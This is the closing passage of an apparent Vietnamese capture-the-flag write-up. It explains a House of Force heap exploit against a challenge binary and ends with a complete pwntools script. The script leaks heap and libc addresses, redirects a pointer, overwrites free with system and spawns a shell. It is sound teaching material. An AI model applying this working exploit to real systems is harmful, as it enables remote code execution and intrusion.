sla(b'> ', b'1')
sla(b'Size: ', str(offset))
name(0xb4, p64(0x601098))
read()
```
- Vì có điều kiện nếu size < 0 hoặc name không tồn tại sau khi malloc thì quay lại vòng lặp nên chỗ này phải nhập tay
![image](https://hackmd.io/_uploads/H1YJo5CA1e.png)
![image](https://hackmd.io/_uploads/rJONs9AC1l.png)
- new top chunk tại địa chỉ 0x6010a8, lần malloc tiếp theo sẽ tại địa chỉ này, ta có thể thay đổi con trỏ name
![image](https://hackmd.io/_uploads/SkrAsq0Ckx.png)
- Sau đó ta chỉ việc leak libc, thay đổi free = system, free vùng chứa địa chỉ chứa chuỗi '/bin/sh' rồi lấy shell
![image](https://hackmd.io/_uploads/rkxBh90Rkg.png)

## Full script
```
#!/usr/bin/python3
from pwn import *

exe = ELF("./001")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        user-pwndbg
        b* main +45
        b* main +118
        b* main +200
        b* main +331
        b* main +370
        b* main +441
        c
        ''')

if args.REMOTE:
    conn = ''.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
# GDB()

def name(size, name):
    sla(b'> ', b'1')
    sla(b'Size: ', str(size))
    sa(b'Name: ', name)

def change(name):
    sla(b'> ', b'2')
    sa(b'name: ', name)

def remove():
    sla(b'> ', b'3')

def read():
    sla(b'>', b'4')

name(0x108, b'a'*(0x108 - 8))
read()
ru(b'a'*248)
heap_leak = u32(r(4)) + 256
log.info(hex(heap_leak))

new_top = 0x6010b0
offset = new_top - 0x20 - heap_leak
log.info(offset)
change(b'a'*0x100 + p64(0xffffffffffffffff))
sla(b'> ', b'1')
sla(b'Size: ', str(offset))
name(0xb4, p64(0x601098))
read()
ru(b'Name: ')
libc.address = u64(r(6) + b'\x00\x00') - 3786048
log.info(hex(libc.address))
change(p64(libc.address + 3786048) + p64(0)*2 + p64(0x601010))
pl = p64(libc.sym['system'])
pl += p64(libc.address + 424144)
pl += p64(libc.address + 322320) 
pl += p64(libc.address + 894576)
pl += p64(libc.address + 132752)
pl += p64(libc.address + 492944)
pl += p64(libc.address + 425888)
pl += p64(libc.address + 408096) + p64(0)*5
pl += p64(libc.address + 3786272) + p64(0)
pl += p64(libc.address + 3782880) + p64(0)
pl += p64(libc.address + 3786048) + p64(0)*2
pl += p64(0x0000000000601168)
change(pl)
change(b'/bin/sh')

name(0x20, b'/bin/sh')
remove()

p.interactive()
```